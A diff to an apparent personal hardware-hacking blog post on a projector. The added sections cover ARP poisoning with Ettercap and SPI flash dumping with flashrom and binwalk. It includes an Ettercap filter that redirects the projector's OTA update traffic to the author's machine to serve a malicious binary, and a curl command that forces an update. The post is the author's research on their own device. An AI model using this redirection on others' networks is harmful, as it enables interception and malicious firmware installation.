@@ -251,7 +251,7 @@ MD5=678254f11abb56dc03dd28ebd214a6fe
 MD5_OTA=5d5ed480e0061efcf1df14870a1bd952
 ```
 
-I'm starting to wonder if I can force my own OTA by ARP Poisoning the network and advertising that IP Address as my own... Anyway, I'll look into that later. I want to try dumping the firmware from the Flash chip, but truth be told, my SOIC8 doesn't get here until tomorrow. You know what that means... hand-jamming a bunch of components that shouldn't be in the same solution to get something that half works (⌐▨_▨).
+I'm starting to wonder if I can force my own OTA by ARP Poisoning the network and advertising that IP Address as my own... Anyway, I'll look into that later. I want to try dumping the firmware from the Flash chip, but truth be told, my SOIC8 reader doesn't get here until tomorrow. You know what that means... hand-jamming a bunch of components that shouldn't be in the same solution to get something that half works (⌐▨_▨).
 
 ### Dumping the Firmware
 
@@ -263,7 +263,7 @@ I tried my best to read the text off the chip, and googled "XMC 25OH128" which b
 
 ![XM25QH128C Schematic](./images/schematic.png)
 
-This is great and all, but what it doesn't tell me is the orientation of the chip, i.e. is the white dot on the chip the `CS` or the `SI`? I ended up pulling their actual [Data Sheet](https://www.xmcwh.com/uploads/801/XM25QH128C_Ver2.1.pdf) which proved to be *much* more useful.
+This is great and all, but what it doesn't tell me is the orientation of the chip, i.e. is the dot on the chip the `CS` or the `SI`? I ended up pulling their actual [Data Sheet](https://www.xmcwh.com/uploads/801/XM25QH128C_Ver2.1.pdf) which proved to be *much* more useful.
 
 First, we have to figure out some information from the rest of the characters on the physical chip itself, as this will tell us the chip layout. Using the "Ordering Information" diagram from the Data Sheet:
 
@@ -279,7 +279,190 @@ Okay, let's get some of the test-hooks onto the legs of the Flash chip, connect 
 
 ![SPI Mem Manager Wiring Guide](./images/flipper-wiring-guide.png)
 
-I got the FlipperZero all wired up, but the screen just sits at "Detecting SPI Chip...". I looked at the source for the SPI Mem Manager, and saw that the [XMC25QH128CH might not be supported](https://github.com/flipperdevices/flipperzero-good-faps/blob/3322caaeb25e1fa50d55f864ba2034b2c8b09292/spi_mem_manager/lib/spi/spi_mem_chip_arr.c#L1401)... Bummer. I'll have a go again tomorrow when my SOIC8 gets in the mail.
+I got the FlipperZero all wired up, but the screen just sits at "Detecting SPI Chip...". I looked at the source for the SPI Mem Manager, and saw that the [XMC25QH128CH might not be supported](https://github.com/flipperdevices/flipperzero-good-faps/blob/3322caaeb25e1fa50d55f864ba2034b2c8b09292/spi_mem_manager/lib/spi/spi_mem_chip_arr.c#L1401)... Bummer. I'll have a go again tomorrow when my SOIC8 reader gets in the mail.
 
 ![Detecting Screen](./images/detecting.png)
 ![FlipperZero Wiring](./images/flipper-wiring.png)
+
+
+## ARP Spoofing
+
+I was originally going to wait for my SOIC8 reader to get into the mail, but I had some late-night (lol, it's 8pm) motivation to try the ARP Spoofing route. The idea is we abuse the OTA functionality that the projector has, run our own web server hosting a malicious binary, and finally poison the ARP in our network to force the projector to think we're the update server.
+
+I'll start a WireShark capture, start the projector, and wait for the ARP request packet to come through to confirm this should work. Truth be told, and I'm sure it's evident at this point, I am *not* a networking guy. So whether or not I'm on the right track for this is unbeknownst to me.
+
+I didn't see the IP Address I expected, and that kind of makes sense. Why would you ask around your subnet who has the IP Address that doesn't belong in your network. After a few rounds of The Finals, and a solid 10 hours of sleep, I decided to try again.
+
+I went ahead and used Ettercap to conduct the ARP Poisoning attack by selecting the Projector as "Target 1" and my gateway as "Target 2". I restarted the projector, quickly conducted the attack, and saw the connection I cared about:
+
+![ARP Poison](./images/ettercap-connection.png)
+
+The only other thing to do is figure out how to redirect that traffic to me, rather than just inspecting it. To do this, we'll make an Ettercap Filter that filters the connection to the one of interest, and changes the destination IP Address.
+
+```c
+if (eth.proto == IP && ip.src == '10.0.0.227' && ip.dst == '43.254.2.156' && ip.proto == TCP && tcp.dst == 8000) {
+    msg("We have a connection match!");
+    eth.src = "\x38\xba\xf8\x12\x76\xc2";
+    ip.dst = '10.0.0.118';
+}
+```
+
+And then, we can compile the filter, and dump out the "assembly" for it to confirm the logic:
+
+```bash
+sudo etterfilter -d -o test.ef test.ecf
+
+????&&&=#+#????+----?;?;?;?;=!
+etterfilter 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+
+ 14 protocol tables loaded:
+	DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth 
+
+ 13 constants loaded:
+	VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP 
+
+ Parsing source file 'test.filter'  done.
+
+ Unfolding the meta-tree  done.
+
+ Converting labels to real offsets  done.
+
+ Writing output to 'test.ef'  done.
+
+ -> Script encoded into 9 instructions.
+
+
+$ sudo etterfilter -t test.ef
+
+etterfilter 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+Content filters loaded from test.ef...
+Disassebling "test.ef" content...
+
+0000: TEST level 3, offset 12, size 4, == 167772387 [0xa0000e3]
+0001: JUMP IF FALSE to 0009
+0002: TEST level 3, offset 16, size 4, == 738067100 [0x2bfe029c]
+0003: JUMP IF FALSE to 0009
+0004: TEST level 3, offset 9, size 1, == 6 [0x6]
+0005: JUMP IF FALSE to 0009
+0006: TEST level 4, offset 2, size 2, == 8000 [0x1f40]
+0007: JUMP IF FALSE to 0009
+0008: ASSIGNMENT level 3, offset 16, size 4, value 167772278 [0xa000076]
+
+ 9 instructions decoded.
+```
+
+This all looks great. Let's load the filter into Ettercap, start a simple Python server using `python3 -m http.server 8000`, and restart the projector. Once the projector came back online, I conducted a spoof attack again, saw the connection go through, and actually saw that Ettercap modified it. However, I didn't get any connections on my Python server. I'm not very sure why this is happening. However, what I'll do instead, to be a little less disruptive, is change the response from the remote server to be a redirect to my IP Address, and hope that works instead. This is application-specific, as the projector will need to know what to do with a redirect in the first place. But let's try it!
+
+As a quick aside, while I was doing all of this, I was realizing that this attack vector is fairly limited, i.e. you have to wait for the projector to come online, ARP Poison projector to start a MITM attack, and catch the OTA logic that only happens on startup. Until I found an endpoint that forces the device to attempt an OTA: `curl http://10.0.0.227/cgi-bin/ota_start.cgi -X POST --data-raw 'updatetxt=1'`. Now we can hit that whenever we want while we test our scripts.
+
+I ran another test and something happened... My projector isn't connecting to the WiFi anymore! I messed around with the cables, turned it on and off a few times, but nothing was working. I plugged the UART back in and read the startup sequence log and it isn't even trying to connect to my WiFi network or get an IP. I think I accidentally clicked a "Reset the Device" button on the webpage, by accident erasing my WiFi login information. And since I accidentally broke the projector, I can't make it re-join my network. What a bummer. I ordered a replacement projector in the meantime.
+
+### Back to SPI
+
+While I wait for my new projector to get here, I can try using the SOIC8 reader that just got in! I installed `flashrom`, plugged everything in, realized I had to use a different USB port (thanks random GitHub Issue!), and got a dump! I just made sure to specify the chip I was reading from and the programmer I was using.
+
+```bash
+$ sudo flashrom --verbose --programmer ch341a_spi --chip XM25QH128C --read rom.bin                                                    1 ↵
+flashrom unknown on Linux 6.1.0-16-amd64 (x86_64)
+flashrom is free software, get the source code at https://flashrom.org
+
+Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns).
+flashrom was built with GCC 12.2.0, little endian
+Command line (7 args): flashrom --verbose --programmer ch341a_spi --chip XM25QH128C --read rom.bin
+Initializing ch341a_spi programmer
+Device revision is 3.0.4
+The following protocols are supported: SPI.
+Probing for XMC XM25QH128C, 16384 kB: compare_id: id1 0x20, id2 0x4018
+Added layout entry 00000000 - 00ffffff named complete flash
+Found XMC flash chip "XM25QH128C" (16384 kB, SPI) on ch341a_spi.
+Chip status register is 0x40.
+This chip may contain one-time programmable memory. flashrom cannot read
+and may never be able to write it, hence it may not be able to completely
+clone the contents of this chip (see man page for details).
+===
+This flash part has status UNTESTED for operations: PROBE READ ERASE WRITE WP
+The test status of this chip may have been updated in the latest development
+version of flashrom. If you are running the latest development version,
+please email a report to flashrom@flashrom.org if any of the above operations
+work correctly for you with this flash chip. Please include the flashrom log
+file for all operations you tested (see the man page for details), and mention
+which mainboard or programmer you tested in the subject line.
+Thanks for your help!
+Reading flash... done.
+```
+
+After longer than I was expecting it finished up. It looks to be 16Mb which is exactly what is expected after referring to the manufacturer's Data Sheet. I ran `binwalk` on it and extracted the filesystem!
+
+```bash
+$ du -h rom.bin 
+16M	rom.bin
+$ file rom.bin 
+rom.bin: data
+$ binwalk -e rom.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+84093         0x1487D         xz compressed data
+84784         0x14B30         CRC32 polynomial table, little endian
+196608        0x30000         uImage header, header size: 64 bytes, header CRC: 0xC8F7DBBE, created: 2022-08-08 06:58:19, image size: 186376 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0xC74D0BC1, OS: Firmware, CPU: ARM, image type: OS Kernel Image, compression type: lzma, image name: "MVX4##I2M#g#######CM_UBT1501#XVM"
+196672        0x30040         xz compressed data
+393216        0x60000         uImage header, header size: 64 bytes, header CRC: 0xAB7FA5B, created: 2022-08-08 07:00:30, image size: 2132140 bytes, Data Address: 0x20008000, Entry Point: 0x20008000, data CRC: 0xB1AF46FD, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: lzma, image name: "MVX4##I2M#g#######KL_LX409##[BR:"
+393280        0x60040         xz compressed data
+2556304       0x270190        JPEG image data, JFIF standard 1.02
+2571860       0x273E54        JPEG image data, JFIF standard 1.01
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/squashfs-root/lib/modules/4.9.84 -> /config/modules/4.9.84; changing link target to /dev/null for security purposes.
+2686976       0x290000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 1549334 bytes, 215 inodes, blocksize: 131072 bytes, created: 2022-08-13 07:08:38
+4259840       0x410000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2899550 bytes, 129 inodes, blocksize: 131072 bytes, created: 2022-08-13 07:08:39
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/squashfs-root-1/ntpdate -> /config/ntpdate; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/squashfs-root-1/iwconfig -> /config/iwconfig; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/squashfs-root-1/sd20x_dongle -> /config/sd20x_dongle; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/squashfs-root-1/iwpriv -> /config/iwpriv; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/squashfs-root-1/res/boa/itag -> /run/itag; changing link target to /dev/null for security purposes.
+7536640       0x730000        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 6389004 bytes, 305 inodes, blocksize: 131072 bytes, created: 2022-08-13 07:08:39
+15728768      0xF00080        Zlib compressed data, compressed
+15729088      0xF001C0        Zlib compressed data, compressed
+15729316      0xF002A4        Zlib compressed data, compressed
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/jffs2-root/p2p_supplicant -> /config/wifi/wpa_supplicant; changing link target to /dev/null for security purposes.
+15729736      0xF00448        JFFS2 filesystem, little endian
+15733244      0xF011FC        Zlib compressed data, compressed
+15768844      0xF09D0C        Zlib compressed data, compressed
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/jffs2-root-0/p2p_supplicant -> /config/wifi/wpa_supplicant; changing link target to /dev/null for security purposes.
+15794176      0xF10000        JFFS2 filesystem, little endian
+
+WARNING: Symlink points outside of the extraction directory: /home/axel/Desktop/(Im)PerfectProject(or)/_rom.bin-0.extracted/jffs2-root-1/p2p_supplicant -> /config/wifi/wpa_supplicant; changing link target to /dev/null for security purposes.
+15861956      0xF208C4        JFFS2 filesystem, little endian
+15863468      0xF20EAC        JFFS2 filesystem, little endian
+15863612      0xF20F3C        JFFS2 filesystem, little endian
+15863908      0xF21064        JFFS2 filesystem, little endian
+15864064      0xF21100        JFFS2 filesystem, little endian
+15864372      0xF21234        JFFS2 filesystem, little endian
+15864840      0xF21408        JFFS2 filesystem, little endian
+15865000      0xF214A8        JFFS2 filesystem, little endian
+15866300      0xF219BC        JFFS2 filesystem, little endian
+15866744      0xF21B78        JFFS2 filesystem, little endian
+15866892      0xF21C0C        JFFS2 filesystem, little endian
+15867644      0xF21EFC        JFFS2 filesystem, little endian
+15867948      0xF2202C        JFFS2 filesystem, little endian
+15868252      0xF2215C        JFFS2 filesystem, little endian
+15868552      0xF22288        JFFS2 filesystem, little endian
+15870052      0xF22864        JFFS2 filesystem, little endian
+15870352      0xF22990        JFFS2 filesystem, little endian
+15870648      0xF22AB8        JFFS2 filesystem, little endian
+15873500      0xF235DC        JFFS2 filesystem, little endian
+16629248      0xFDBE00        JFFS2 filesystem, little endian
+16629828      0xFDC044        Zlib compressed data, compressed
+16630312      0xFDC228        JFFS2 filesystem, little endian
+16630988      0xFDC4CC        JFFS2 filesystem, little endian
+16646144      0xFE0000        JFFS2 filesystem, little endian
+```
+
